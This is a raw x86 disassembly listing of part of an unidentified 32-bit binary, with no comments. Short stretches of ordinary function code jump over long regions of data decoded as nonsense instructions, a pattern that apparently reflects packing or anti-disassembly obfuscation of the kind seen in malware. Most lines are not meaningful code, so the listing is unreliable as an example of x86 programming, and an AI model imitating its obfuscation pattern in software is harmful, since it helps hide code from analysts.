  4054b8:	adc    dh,0xde
  4054bb:	dec    esp
  4054bc:	stos   DWORD PTR es:[edi],eax
  4054bd:	pop    es
  4054be:	(bad)  
  4054bf:	mov    eax,ebx
  4054c1:	mov    ch,0xd6
  4054c3:	or     bh,BYTE PTR [ebx-0x5d]
  4054c6:	sahf   
  4054c7:	fcom   QWORD PTR [eax]
  4054c9:	(bad)  
  4054ca:	cmp    eax,0x43e4288a
  4054cf:	not    ebx
  4054d1:	rcr    DWORD PTR [eax+0x45],0x3a
  4054d5:	pusha  
  4054d6:	push   0xcf808347
  4054db:	fild   DWORD PTR [ebx+eax*8]
  4054de:	clc    
  4054df:	out    0xa1,eax
  4054e1:	mov    eax,ds:0xa33dbb73
  4054e6:	pop    ss
  4054e7:	aaa    
  4054e8:	call   0x6882d2d3
  4054ed:	arpl   WORD PTR [ecx],bx
  4054ef:	(bad)  
  4054f0:	ret    0x75dc
  4054f3:	lahf   
  4054f4:	and    DWORD PTR [ebx-0x78],edi
  4054f7:	outs   dx,BYTE PTR ds:[esi]
  4054f8:	cmc    
  4054f9:	mov    ebx,0x7fd5a62f
  4054fe:	xchg   edx,eax
  4054ff:	into   
  405500:	dec    esi
  405501:	call   0xcf7b20b6
  405506:	(bad)  
  405507:	out    0xe4,eax
  405509:	add    edx,esp
  40550b:	stos   DWORD PTR es:[edi],eax
  40550c:	add    eax,0xdc0c236f
  405511:	enter  0x3c1a,0x38
  405515:	mov    edi,0x71d2ea0c
  40551a:	mov    eax,0xa5e54a5e
  40551f:	dec    edi
  405520:	sub    ebx,DWORD PTR [ebp+0x85d15d3]
  405526:	gs pop edx
  405528:	inc    ecx
  405529:	fwait
  40552a:	pop    ss
  40552b:	jnp    0x40559c
  40552d:	stos   BYTE PTR es:[edi],al
  40552e:	jmp    0x9127:0x435cb581
  405535:	ror    edi,1
  405537:	mov    al,0x5a
  405539:	clc    
  40553a:	js     0x405547
  40553c:	pop    esp
  40553d:	dec    ecx
  40553e:	mov    BYTE PTR [edi-0x38118c44],ch
  405544:	and    BYTE PTR [edx+0x2c],dh
  405547:	sbb    BYTE PTR [eax-0x1e28869f],0x93
  40554e:	push   ss
  40554f:	jmp    0xc08802cb
  405554:	xor    al,0x96
  405556:	jb     0x4055bf
  405558:	(bad)
  40555b:	test   eax,0xc022d120
  405560:	jg     0x4055c1
  405562:	sub    esi,0x4
  405565:	jne    0x4054ed
  405567:	inc    esp
  405568:	inc    eax
  405569:	cwde   
  40556a:	jo     0x40557b
  40556c:	scas   al,BYTE PTR es:[edi]
  40556d:	sub    al,0xf1
  40556f:	add    esp,DWORD PTR [edi+0x2dcb7359]
  405575:	enter  0x6b34,0x7b
  405579:	inc    ebp
  40557a:	loop   0x40555b
  40557c:	and    al,0xb8
  40557e:	jecxz  0x4055e5
  405580:	stos   DWORD PTR es:[edi],eax
  405581:	pop    eax
  405582:	fdivr  DWORD PTR [ecx+0x52]
  405585:	rol    bl,cl
  405587:	mov    bh,0x5a
  405589:	adc    DWORD PTR [esi-0x655176ee],ecx
  40558f:	sbb    al,0x4c
  405591:	adc    DWORD PTR [edx-0x66e03191],ebp
  405597:	cmc    
  405598:	fwait
  405599:	pop    es
  40559a:	aas    
  40559b:	div    ecx
  40559d:	mov    ecx,DWORD PTR [ebp+0x10]
  4055a0:	and    ecx,eax
  4055a2:	or     ecx,0x81161d8f
  4055a8:	mov    eax,ecx
  4055aa:	pop    ebp
  4055ab:	ret    0x18
  4055ae:	push   ebp
  4055af:	mov    ebp,esp
  4055b1:	push   ecx
  4055b2:	xor    edx,edx
  4055b4:	xor    edx,DWORD PTR ds:0x4454d4
  4055ba:	xor    ecx,ecx
  4055bc:	or     ecx,DWORD PTR ds:0x44b700
  4055c2:	sub    edx,ecx
  4055c4:	sub    edx,DWORD PTR [edx+ecx*1]
  4055c7:	mov    DWORD PTR [ebp-0x4],0xf89c8531
  4055ce:	movzx  eax,WORD PTR ds:0x44e424
  4055d5:	adc    DWORD PTR ds:0x4248c2,eax
  4055db:	jmp    0x405714
  4055e0:	ins    DWORD PTR es:[edi],dx
  4055e1:	je     0x40559f
  4055e3:	xchg   DWORD PTR [ebp+0x47],edx
  4055e6:	jge    0x4055e2
  4055e8:	fs pop ebp
  4055ea:	mov    eax,0x299cbf77
  4055ef:	push   esi
  4055f0:	adc    BYTE PTR [edx],ch
  4055f2:	jl     0x405670
  4055f4:	sbb    BYTE PTR [edi+0x7c],bh
  4055f7:	jl     0x405628
  4055f9:	and    eax,DWORD PTR [edx+0x5404faab]
  4055ff:	(bad)  
  405601:	jbe    0x4055f9
  405603:	test   al,0xdb
  405605:	ins    BYTE PTR es:[edi],dx
  405606:	dec    edi
  405607:	inc    edi
  405608:	push   ebp
  405609:	pop    esp
  40560a:	arpl   WORD PTR [edx],sp
  40560c:	adc    al,0x27
  40560e:	ror    BYTE PTR [ebp-0x7c121abc],1
  405614:	iret   
  405615:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  405616:	push   ebp
  405617:	iret   
  405618:	dec    ebx
  405619:	fwait
  40561a:	js     0x4055fb
  40561c:	and    bl,dl
  40561e:	lods   al,BYTE PTR ds:[esi]
  40561f:	inc    ecx
  405620:	xchg   ebp,eax
  405621:	fisubr WORD PTR [ecx-0x2c]
  405624:	mov    ebp,esi
  405626:	and    eax,0x623462d
  40562b:	inc    ebx
  40562c:	adc    cl,BYTE PTR [ebx+0x50]
  40562f:	xor    al,0x83
  405631:	sub    DWORD PTR [esi],esp
  405633:	loopne 0x405635
  405635:	retf   
  405636:	xchg   ebp,eax
  405637:	ins    BYTE PTR es:[edi],dx
  405638:	pop    ebp
  405639:	add    esp,DWORD PTR [esi-0x57eeb6e7]
  40563f:	popa   
  405640:	sub    edx,DWORD PTR [ecx-0x772eb1b9]
  405646:	or     BYTE PTR [esi],al
  405648:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  405649:	mov    ?,WORD PTR [ecx+0x48348836]
  40564f:	fisttp DWORD PTR [edi-0x4f0086d2]
  405655:	lahf   
  405656:	ficom  DWORD PTR [esi]
  405658:	(bad)  
  405659:	aaa    
  40565a:	cli    
  40565b:	sub    ah,ch
  40565d:	iret   
  40565e:	ins    BYTE PTR es:[edi],dx
  40565f:	jl     0x40563c
  405661:	push   edi
  405662:	paddsb mm5,QWORD PTR [edi]
  405665:	add    dh,BYTE PTR [eax+eiz*8-0x4c8c2210]
  40566c:	jge    0x4056e7
  40566e:	repz push cs
  405670:	addr16 in eax,0xd3
  405673:	dec    edi
  405674:	inc    ecx
  405675:	push   cs
  405676:	aaa    
  405677:	js     0x405601
  405679:	(bad)  
  40567a:	cdq    
  40567b:	mov    dh,0xdc
  40567d:	hlt    
  40567e:	jl     0x40561d
  405680:	inc    eax
  405681:	dec    ebp
  405682:	in     al,0x11
  405684:	scas   eax,DWORD PTR es:[edi]
  405685:	inc    edi
  405686:	sbb    DWORD PTR [eax-0x50],0x39
  40568a:	sbb    ah,BYTE PTR [ecx+0x57]
  40568d:	aam    0xe
  40568f:	xchg   esi,eax
  405690:	in     eax,dx
  405691:	pushf  
  405692:	xlat   BYTE PTR ds:[ebx]
  405693:	retf   0x5888
  405696:	(bad)  
  405697:	leave  
  405698:	cmp    edi,DWORD PTR [ecx]
  40569a:	addr16 int 0xbb
  40569d:	cvtps2pi mm6,QWORD PTR [edx+0x56a323e1]
  4056a4:	imul   al
  4056a6:	dec    esp
  4056a7:	in     al,0xe3
  4056a9:	mov    eax,ds:0xb150a145
  4056ae:	push   ss
  4056af:	mov    cl,0xdd
  4056b1:	dec    ebx
  4056b2:	xchg   ebp,eax
  4056b3:	adc    DWORD PTR [ebp+ebx*1-0x2a],edx
  4056b7:	xchg   edx,eax
  4056b8:	or     esp,DWORD PTR [eax]
  4056ba:	sti    
  4056bb:	push   ss
  4056bc:	xchg   ebp,eax
  4056bd:	loope  0x405713
  4056bf:	sbb    eax,DWORD PTR [esi-0x254e0ddd]
  4056c5:	into   
  4056c6:	xchg   edx,eax
  4056c7:	or     al,BYTE PTR [ecx]
  4056c9:	dec    ebx
  4056ca:	repz mov ecx,0x5ec744f
  4056d0:	dec    ecx
  4056d1:	jns    0x405688
  4056d3:	mov    ds:0x34910208,al
  4056d8:	jb     0x4056bd
  4056da:	into   
  4056db:	adc    BYTE PTR ds:0x167dfb4b,cl
  4056e1:	cs loopne 0x40566c
  4056e4:	dec    eax
  4056e5:	mov    ah,ah
  4056e7:	ror    DWORD PTR [edx+0x5e42e6a2],0x41
  4056ee:	cs ret 
  4056f0:	sbb    eax,DWORD PTR [ecx+ebp*4]
  4056f3:	cmp    al,0x70
  4056f5:	fisub  DWORD PTR [ebx]
  4056f7:	popa   
  4056f8:	(bad)  
  4056f9:	mov    ds:0xf136e198,al
  4056fe:	repz icebp 
  405700:	add    ch,BYTE PTR [esp+ebx*4-0x44]
  405704:	and    eax,0xbb23d3f0
  405709:	int3   
  40570a:	push   esi
  40570b:	xchg   BYTE PTR [ecx],bl
  40570d:	xor    DWORD PTR [edx+ebp*8],esi
  405710:	outs   dx,DWORD PTR ds:[esi]
  405711:	mov    edi,0x458b81f0
  405716:	cld    
  405717:	mov    edx,DWORD PTR [ebp+0x10]
  40571a:	or     ecx,0x2821
  405720:	mov    ecx,0x7510857
  405725:	not    DWORD PTR ds:0x4248de
  40572b:	jmp    0x405864
  405730:	xor    al,dh
  405732:	push   0x65
  405734:	jp     0x40579b
  405736:	fnstsw WORD PTR [ecx-0x7c]
  405739:	mov    ebp,0x75dd0b79
  40573e:	mov    esp,DWORD PTR [edx+0x3c]
  405741:	sub    eax,0x7f187c7c
  405746:	jl     0x4057c4
  405748:	packuswb mm4,QWORD PTR [edi]
  40574b:	inc    esi
  40574c:	aaa    
  40574d:	mov    edx,0x4b50aba3
  405752:	repnz mov cl,0x0
  405755:	sub    eax,0xa62a59ae
  40575a:	cmp    DWORD PTR [ebp-0x3ec2881b],eax
  405760:	test   eax,0x3d7e2b0
  405765:	dec    esi
  405766:	push   esi
  405767:	mov    eax,DWORD PTR [esi-0x6a]
  40576a:	aad    0x82
  40576c:	dec    edx
  40576d:	sbb    eax,0xf3c9a693
  405772:	or     eax,0xaf5a661f
  405777:	mov    ds:0x10cf789d,eax
  40577c:	les    edi,FWORD PTR [ecx+0x6ee4819d]
  405782:	xchg   edx,eax
  405783:	test   BYTE PTR [ecx+ebp*1],cl
  405786:	dec    ebx
  405787:	imul   edx,edx,0x9
  40578a:	cmp    al,0x6c
  40578c:	call   0x9388:0xa981622f
  405793:	or     al,0x2f
  405795:	fcmovb st,st(3)
  405797:	or     DWORD PTR [ecx],0x2b
  40579a:	ret    
  40579b:	jp     0x4057a9
  40579d:	aas    
  40579e:	std    
  40579f:	mov    WORD PTR [ebp+0x4281b38a],cs
  4057a5:	pop    ds
  4057a6:	jae    0x4057e9
  4057a8:	jl     0x4057c9
  4057aa:	ss in  eax,dx
  4057ac:	jge    0x40573d
  4057ae:	add    eax,0xfc6e96d0
  4057b3:	dec    edi
  4057b4:	fistp  DWORD PTR ds:0xcc7a1a23
  4057ba:	mov    bh,0x1d
  4057bc:	xor    edx,eax
  4057be:	retf   
  4057bf:	outs   dx,BYTE PTR ds:[esi]
  4057c0:	in     eax,dx
  4057c1:	pop    esp
  4057c2:	adc    eax,ecx
  4057c4:	xor    edx,DWORD PTR [esi+0x1d]
  4057c7:	les    esi,FWORD PTR [ecx+eiz*2+0x3b52e727]
  4057ce:	fwait
  4057cf:	xchg   ebp,eax
  4057d0:	sbb    DWORD PTR [eax],ebx
  4057d2:	outs   dx,DWORD PTR ds:[esi]
  4057d3:	adc    ebx,DWORD PTR [ecx+0x4a]
  4057d6:	aas    
  4057d7:	jo     0x4057dc
  4057d9:	mov    bh,0xf4
  4057db:	jae    0x405809
  4057dd:	add    dl,BYTE PTR [ebx]
  4057df:	xchg   esi,eax
  4057e0:	in     al,dx
  4057e1:	bound  ecx,QWORD PTR [edi-0x3d]
  4057e4:	dec    ebx
  4057e5:	jo     0x405858
  4057e7:	es pop es
  4057e9:	and    bh,BYTE PTR [ecx]
  4057eb:	mov    ecx,0xa43aa902
  4057f0:	jmp    0x4360:0xc908beb2
  4057f7:	jne    0x4057e8
  4057f9:	in     eax,0x8
  4057fb:	cmovg  ebx,esp
  4057fe:	jne    0x4057bf
  405800:	retf   0xecdb
  405803:	add    al,0xd8
  405805:	cmp    al,0xdd
  405807:	mov    dh,0x86
  405809:	sub    edx,DWORD PTR [edi]
  40580b:	adc    cl,BYTE PTR [eax]
  40580d:	icebp  
  40580e:	sar    BYTE PTR [ecx+ebx*8-0x6e],1
  405812:	pop    es
  405813:	cld    
  405814:	or     edx,esp
  405816:	je     0x4057c3
  405818:	aam    0x3a
  40581a:	adc    al,BYTE PTR [ebx-0x5b]
  40581d:	adc    ax,0x1523
  405821:	push   esp
  405822:	jnp    0x405820
  405824:	jmp    0x9c5bacbc
  405829:	rcl    DWORD PTR [edx+0x48af203],cl
  40582f:	pop    ebp
  405830:	mov    BYTE PTR [eax-0x600bf947],al
  405836:	or     eax,0x321e89c5
  40583b:	dec    esi
  40583c:	xchg   ebp,eax
  40583d:	cld    
  40583e:	shl    BYTE PTR [ebp-0x28],cl
  405841:	mov    ebx,0x9b72f282
  405846:	dec    ebp
  405847:	sub    DWORD PTR [ecx-0x41],ebp
  40584a:	and    BYTE PTR ds:0xdb50b45a,0xf5
  405851:	push   esi
  405852:	aaa    
  405853:	call   FWORD PTR [esi-0x76]
  405856:	cld    
  405857:	es xchg edi,eax
  405859:	ds jecxz 0x4057e0
  40585c:	or     ebp,DWORD PTR [edi+0x354799c8]
  405862:	lods   al,BYTE PTR ds:[esi]
  405863:	repz xor eax,ecx
  405866:	add    eax,0x32729e
  40586b:	or     DWORD PTR ds:0x4248d6,0x448984
  405875:	mov    DWORD PTR [edx],eax
  405877:	neg    edx
  405879:	mov    eax,DWORD PTR [ebp+0x14]
  40587c:	and    DWORD PTR ds:0x448994,0x0
  405886:	xor    edx,edx
  405888:	add    edx,DWORD PTR ds:0x448994
  40588e:	inc    edx
  40588f:	mov    DWORD PTR ds:0x448994,edx
  405895:	cmp    DWORD PTR ds:0x448994,0x14
  40589c:	jne    0x4058b0
  4058a2:	push   DWORD PTR [ebp-0x28]
  4058a5:	push   0x4489a4
  4058aa:	call   DWORD PTR ds:0x443360
  4058b0:	cmp    DWORD PTR ds:0x448994,0x13
  4058b7:	jb     0x405886
  4058bd:	mov    edx,DWORD PTR [ebp+0x10]
  4058c0:	mov    DWORD PTR [edx+0x4],eax
  4058c3:	mov    eax,DWORD PTR [ebp+0x18]
  4058c6:	mov    edx,DWORD PTR [ebp+0x10]
  4058c9:	mov    DWORD PTR [edx+0x8],eax
  4058cc:	mov    eax,DWORD PTR [ebp+0x1c]
  4058cf:	mov    edx,DWORD PTR [ebp+0x10]
  4058d2:	jmp    0x405a0b
  4058d7:	in     eax,0xab
  4058d9:	ins    DWORD PTR es:[edi],dx
  4058da:	push   es
  4058db:	jge    0x4058a3
  4058dd:	imul   edi,DWORD PTR gs:[ecx],0x49
  4058e1:	mov    al,ds:0x49f883b9
  4058e6:	xor    eax,0x7c7c2cd8
  4058eb:	sbb    BYTE PTR [edi+0x7c],bh
  4058ee:	jl     0x405952
  4058f0:	shl    BYTE PTR [esi-0x1e],1
  4058f3:	jnp    0x40592f
  4058f5:	mov    ds:0x409ed2b8,eax
  4058fa:	sahf   
  4058fb:	sahf   
  4058fc:	xor    edx,esi
  4058fe:	mov    al,0x85
  405900:	cmp    DWORD PTR [ebx+0x21be7c05],esi
  405906:	mov    bl,0xb6
  405908:	xchg   esp,eax
  405909:	cmp    DWORD PTR [edi+esi*1],0x548a2b0e
  405910:	push   edx
  405911:	mov    ds:0x9ed62dfe,eax
  405916:	xor    DWORD PTR [ecx-0x7ba7e0ba],edi
  40591c:	fistp  DWORD PTR [edx-0x6f7a6b59]
  405922:	leave  
  405923:	mov    bh,bl
  405925:	outs   dx,BYTE PTR ds:[esi]
  405926:	lods   eax,DWORD PTR ds:[esi]
  405927:	fmulp  st(6),st
  405929:	lock sbb bl,BYTE PTR [edi-0x75e7ccbd]
  405930:	not    BYTE PTR [esi+ecx*2-0xf]
  405934:	repnz sub eax,0x8ce0a6b2
  40593a:	mov    WORD PTR [edi+0x7],fs
  40593d:	mov    cs,WORD PTR [ebp+edx*2+0x281396e6]
  405944:	pop    eax
  405945:	hlt    
  405946:	outs   dx,BYTE PTR ds:[esi]
  405947:	adc    ah,BYTE PTR es:[ecx]
  40594a:	add    al,0x60
  40594c:	adc    al,0xe5
  40594e:	sub    eax,0x9127b554
  405953:	xchg   ebx,eax
  405954:	cmp    DWORD PTR [edi],0x71
  405957:	xor    eax,eax
  405959:	in     eax,dx
  40595a:	jne    0x4058e2
  40595c:	sahf   
  40595d:	mov    eax,0xe18c6bfc
  405962:	xor    al,0x4
  405964:	leave  
  405965:	push   edi
  405966:	in     al,0x90
  405968:	clc    
  405969:	push   ss
  40596a:	add    bl,BYTE PTR [esi+0xaa7ba1]
  405970:	and    al,0xb9
  405972:	mov    eax,ds:0x91eb074f
  405977:	sbb    eax,DWORD PTR [edi-0x7a]
  40597a:	push   ecx
  40597b:	jae    0x405960
  40597d:	sub    al,0xbf
  40597f:	rcr    cl,1
  405981:	shl    BYTE PTR [esp+ebp*2-0x1148a924],0xc9
  405989:	push   edx
  40598a:	mov    ebp,0xd11dcc92
  40598f:	push   es
  405990:	out    dx,eax
  405991:	mov    al,ds:0x55af78b
  405996:	push   0x3b
  405998:	and    ebp,DWORD PTR [ebx-0x2b]
  40599b:	(bad)  [ebx+0x3e0b32de]
  4059a1:	cmp    eax,0x9987355
  4059a6:	fxch   st(2)
  4059a8:	addr16 push edi
  4059aa:	shl    dh,cl
  4059ac:	jnp    0x405982
  4059ae:	setno  BYTE PTR [ebp+edi*4+0x71]
  4059b3:	xor    DWORD PTR ds:0x6418ec85,0x3d
  4059ba:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4059bb:	stos   BYTE PTR es:[edi],al
  4059bc:	frstor [ebx-0x59a2981f]
  4059c2:	mov    ds:0xc2544b42,eax
  4059c7:	mov    al,ds:0xbd8bfde8
  4059cc:	aad    0x11
  4059ce:	loopne 0x4059dc
  4059d0:	sti    
  4059d1:	jae    0x405a05
  4059d3:	xchg   edx,eax
  4059d4:	mov    esp,0xd8e0ee25
  4059d9:	or     eax,0x1aa3e434
  4059de:	or     BYTE PTR [ebp+0x33876048],0xca
  4059e5:	scas   al,BYTE PTR es:[edi]
  4059e6:	jle    0x405a01
  4059e8:	mov    DWORD PTR [ebp-0xd],ecx
  4059eb:	inc    edx
  4059ec:	ror    DWORD PTR [edi],0xcf
  4059ef:	xchg   ebx,eax
  4059f0:	enter  0xdf36,0x7a
  4059f4:	js     0x405a50
  4059f6:	or     al,0xd7
  4059f8:	xor    eax,0xfc063a97
  4059fd:	or     DWORD PTR [eax],0xffffffaa
  405a00:	or     al,BYTE PTR [ecx+0x2c]
  405a03:	lahf   
  405a04:	(bad)  [ebx]
  405a06:	test   BYTE PTR [eax+ebp*1],dh
  405a09:	cmp    edx,DWORD PTR [ecx+ecx*4+0x42]
  405a0d:	or     al,0x8b
  405a0f:	inc    ebp
  405a10:	and    BYTE PTR [ebx+0x42891055],cl
  405a16:	adc    BYTE PTR [ebx+0x14458bc0],cl
  405a1c:	test   eax,eax
  405a1e:	jmp    0x405b57
  405a23:	pop    edx
  405a24:	loope  0x405a4a
  405a26:	sbb    bh,BYTE PTR [ebx+0x5f617add]
  405a2c:	retf   
  405a2d:	mov    cl,0x6b
  405a2f:	sub    ebx,DWORD PTR [ebp+0x2fe40b75]
  405a35:	jl     0x405ab3
  405a37:	sbb    BYTE PTR [edi+0x7c],bh
  405a3a:	jl     0x405a12
  405a3c:	xchg   ecx,eax
  405a3d:	dec    ecx
  405a3e:	shr    BYTE PTR [esp+ebx*4+0x2720eed9],cl
  405a45:	cmp    bh,dh
  405a47:	inc    ebp
  405a48:	push   0xea030123
  405a4d:	in     al,0x65
  405a4f:	pop    ebx
  405a50:	fnstsw WORD PTR [ecx-0x1ffaa7b1]
  405a56:	jecxz  0x405a66
  405a58:	lea    eax,[edx]
  405a5a:	push   edx
  405a5b:	xchg   edx,eax
  405a5c:	push   esp
  405a5d:	pop    esp
  405a5e:	or     DWORD PTR [edx+0x6e],edi
  405a61:	in     eax,0xef
  405a63:	sub    ch,BYTE PTR [ebx]
  405a65:	inc    edx
  405a66:	mov    eax,ds:0xaff1bd4c
  405a6b:	pop    ss
  405a6c:	or     al,0x3d
  405a6e:	lods   al,BYTE PTR ds:[esi]
  405a6f:	repz enter 0xeb71,0x33
  405a74:	retf   0xe125
  405a77:	sub    DWORD PTR [edx],ecx
  405a79:	sbb    eax,0xb82eac86
  405a7e:	clc    
  405a7f:	jo     0x405a63
  405a81:	jbe    0x405ad9
  405a83:	push   ebx
  405a84:	pop    ds
  405a85:	jl     0x405ad6
  405a87:	xchg   esi,eax
  405a88:	bound  esi,QWORD PTR [esi]
  405a8a:	and    eax,0x3c2c16bd
  405a8f:	lea    ebp,[eax+0xa]
  405a92:	or     eax,0x1a191de3
  405a97:	scas   al,BYTE PTR es:[edi]
  405a98:	mov    dh,0xee
  405a9a:	pop    ss
  405a9b:	and    eax,0x72e33c38
  405aa0:	mov    DWORD PTR [edi+0x71],esp
  405aa3:	sbb    DWORD PTR [ebp+0x23d5526f],0x9
  405aaa:	mov    ds,WORD PTR [ecx]
  405aac:	loopne 0x405ae3
  405aae:	mov    al,0x90
  405ab0:	scas   al,BYTE PTR es:[edi]
  405ab1:	sbb    dh,BYTE PTR [ecx+0x115f6008]
  405ab7:	dec    eax
  405ab8:	push   cs
  405ab9:	aam    0x61
  405abb:	and    bl,ah
  405abd:	add    BYTE PTR [ecx+ecx*4],cl
  405ac0:	fdiv   st(0),st
  405ac2:	adc    dl,ch
  405ac4:	dec    ebx
  405ac5:	inc    ebx
  405ac6:	or     esi,DWORD PTR [ecx+0x7a49f985]
  405acc:	mov    ebx,0xc7acf57f
  405ad1:	test   dh,bl
  405ad3:	mov    BYTE PTR [edi-0x4],ch
  405ad6:	rcl    ebx,cl
  405ad8:	pop    eax
  405ad9:	adc    bh,BYTE PTR [edx+ebp*2]
  405adc:	(bad)  
  405add:	mov    dh,0xc1
  405adf:	fist   WORD PTR [ecx-0x3f]
  405ae2:	inc    esp
  405ae3:	xchg   ecx,eax
  405ae4:	or     BYTE PTR [ecx],dl
  405ae6:	sub    DWORD PTR [ecx],ebx
  405ae8:	outs   dx,BYTE PTR ds:[esi]
  405ae9:	or     BYTE PTR [edi],bh
  405aeb:	rol    BYTE PTR [edx+0x3693c71d],1
  405af1:	stos   BYTE PTR es:[edi],al
  405af2:	test   DWORD PTR [ebp+0x4aae760b],0x2b29fc0b
  405afc:	cmp    DWORD PTR [eax+0x506bfe90],edx
  405b02:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  405b03:	jge    0x405af7
  405b05:	cmp    ebp,ebp
  405b07:	es nop
  405b09:	jne    0x405afc
  405b0b:	call   0x9a34:0x1255a099
  405b12:	pop    esi
  405b13:	out    dx,eax
  405b14:	fwait
  405b15:	ret    
  405b16:	stos   DWORD PTR es:[edi],eax
  405b17:	out    0x85,al
  405b19:	add    esi,0xffffffcd
  405b1c:	cmp    bl,BYTE PTR [eax+0x6cbd9772]
  405b22:	jae    0x405b40
  405b24:	in     eax,0xe4
  405b26:	ficom  DWORD PTR [eax]
  405b28:	xchg   ecx,eax
  405b29:	xchg   ebx,eax
  405b2a:	dec    esi
  405b2b:	arpl   WORD PTR [ebx-0x46199b96],bp
  405b31:	mov    ch,0xa8
  405b33:	push   cs
  405b34:	or     ecx,esi
  405b36:	add    al,0xdc
  405b38:	std    
  405b39:	push   ss
  405b3a:	add    edi,DWORD PTR [ebx]
  405b3c:	jl     0x405b69
  405b3e:	outs   dx,DWORD PTR ds:[esi]
  405b3f:	push   ds
  405b40:	sti    
  405b41:	(bad)  [ebp+0x2d1fca48]
  405b47:	inc    eax
  405b48:	clc    
  405b49:	shl    DWORD PTR [eax],0xd1
  405b4c:	test   ah,al
  405b4e:	pop    ss
  405b4f:	dec    esi
  405b50:	jno    0x405b7b
  405b52:	lock mov ebp,DWORD PTR [ebp-0x17]
  405b56:	xor    DWORD PTR [ebx-0x7af0f7bb],ecx
  405b5c:	add    eax,DWORD PTR [eax]
  405b5e:	add    BYTE PTR [eax],al
  405b60:	mov    eax,DWORD PTR [ebp+0xc]
  405b63:	xor    eax,ecx
  405b65:	add    eax,0x32729e
  405b6a:	leave  
  405b6b:	ret    0x1c
  405b6e:	push   ebp
  405b6f:	mov    ebp,esp
  405b71:	sub    esp,0x78
  405b74:	adc    DWORD PTR ds:0x448988,0x7d94
  405b7e:	jmp    0x405caa
  405b83:	or     esp,ebx
  405b85:	dec    ecx
  405b86:	or     BYTE PTR [ecx-0x53],ch
  405b89:	dec    ebp
  405b8a:	aad    0x48
  405b8c:	aas    
  405b8d:	adc    esi,esp
  405b8f:	inc    eax
  405b90:	test   al,0xa
  405b92:	fiadd  WORD PTR [eax+0xd7c7c2e]
  405b98:	jg     0x405c16
  405b9a:	jl     0x405bd4
  405b9c:	aad    0x17
  405b9e:	jbe    0x405b2b
  405ba0:	ins    BYTE PTR es:[edi],dx
  405ba1:	sub    al,0x92
  405ba3:	fistp  DWORD PTR [esi]
  405ba5:	retf   
  405ba6:	mov    al,ds:0xb6eeafe9
  405bab:	mov    eax,ds:0xd7625202
  405bb0:	add    ebp,DWORD PTR [ebp+0x3818b000]
  405bb6:	sub    eax,0x5d748e42
  405bbb:	mov    ebx,0x9d9f192f
  405bc0:	mov    ah,BYTE PTR [ecx+0x69]
  405bc3:	mov    ebx,0x91534054
  405bc8:	fmul   st,st(7)
  405bca:	cmp    esi,eax
  405bcc:	popf   
  405bcd:	and    dl,al
  405bcf:	test   BYTE PTR [ebp+esi*2+0x4614eed8],bh
  405bd6:	mov    bh,0xfe
  405bd8:	pushf  
  405bd9:	out    0x30,eax
  405bdb:	mov    dh,0xe9
  405bdd:	ret    0x451b
  405be0:	loope  0x405c19
  405be2:	push   edi
  405be3:	push   edi
  405be4:	mov    WORD PTR cs:[eax*1-0x7ed41fa],es
  405bec:	and    eax,0xd7d1834
  405bf1:	cwde   
  405bf2:	add    eax,DWORD PTR [ecx]
  405bf4:	push   edi
  405bf5:	xchg   ecx,eax
  405bf6:	retf   0x5201
  405bf9:	into   
  405bfa:	push   DWORD PTR [edx-0x619242bc]
  405c00:	les    ecx,FWORD PTR [eax]
  405c02:	inc    esi
  405c03:	jecxz  0x405be1
  405c05:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  405c06:	mov    ecx,0x1706574b
  405c0b:	sbb    ah,BYTE PTR [eax]
  405c0d:	stc    
  405c0e:	data16 sub al,0x83
  405c11:	pop    ecx
  405c12:	jecxz  0x405c49
  405c14:	pop    eax
  405c15:	ficomp DWORD PTR [esi-0x5b]
  405c18:	adc    bh,dl
  405c1a:	and    esi,eax
  405c1c:	inc    edi
  405c1d:	mov    esp,0xc5bdb2d4
  405c22:	cmp    dh,BYTE PTR [ebx+eax*8+0xe59c2b4]
  405c29:	mov    esi,0x836cd6f3
  405c2e:	push   eax
  405c2f:	push   0xbbc4d931
  405c34:	call   0xd5a4f33d
  405c39:	jns    0x405c27
  405c3b:	add    eax,0x1fd85eab
  405c40:	mov    eax,0x5c356550
  405c45:	push   eax
  405c46:	cmp    dl,al
  405c48:	cmp    esi,ecx
  405c4a:	(bad)  
  405c4c:	fcmovnu st,st(6)
  405c4e:	dec    eax
  405c4f:	sbb    eax,0x9667118c
  405c54:	push   0xffffffc4
  405c56:	and    esp,esi
  405c58:	fnstcw WORD PTR [ebx]
  405c5a:	icebp  
  405c5b:	lock jne 0x405c2d
  405c5e:	add    al,BYTE PTR [edi+0x19b1df12]
  405c64:	popa   
  405c65:	sub    dh,BYTE PTR [eax]
  405c67:	out    dx,al
  405c68:	push   es
  405c69:	mov    edx,0x7eee3f20
  405c6e:	in     al,dx
  405c6f:	sub    DWORD PTR [ebx+0x700022e4],0xa9e4fd69
  405c79:	jge    0x405c00
  405c7b:	jbe    0x405cc9
  405c7d:	push   0x4ff7dc35
  405c82:	push   0x56e349df
  405c87:	xlat   BYTE PTR ds:[ebx]
  405c88:	test   eax,0x56d0c8ee
  405c8d:	adc    bh,BYTE PTR [ebx]
  405c8f:	ja     0x405cb3
  405c91:	lods   al,BYTE PTR ds:[esi]
  405c92:	cmovl  edi,edx
  405c95:	jge    0x405d15
  405c97:	push   ebx
  405c98:	adc    BYTE PTR ss:[ebx-0x4c],dl
  405c9c:	fidiv  WORD PTR [ecx-0x536805ea]
  405ca2:	push   ebp
  405ca3:	dec    esi
  405ca4:	dec    esi
  405ca5:	imul   ecx,DWORD PTR [eax],0x24
  405ca8:	dec    ebp
  405ca9:	dec    esp
  405caa:	mov    eax,ds:0x4451a0
  405caf:	mov    DWORD PTR [ebp-0x10],eax
  405cb2:	mov    eax,ds:0x4452ac
  405cb7:	sub    DWORD PTR ds:0x44e410,0x44b6cc
  405cc1:	mov    DWORD PTR [ebp-0x30],eax
  405cc4:	neg    eax
  405cc6:	mov    DWORD PTR [ebp-0xc],0xf89c8535
  405ccd:	adc    eax,DWORD PTR ds:0x4248ce
  405cd3:	mov    DWORD PTR [ebp-0x14],0xf89c8534
  405cda:	mov    eax,DWORD PTR [ebp-0xc]
  405cdd:	xor    DWORD PTR ds:0x44b6e0,0x59fc
  405ce7:	push   ebx
  405ce8:	or     DWORD PTR ds:0x4248de,0x4248d6
  405cf2:	push   esi
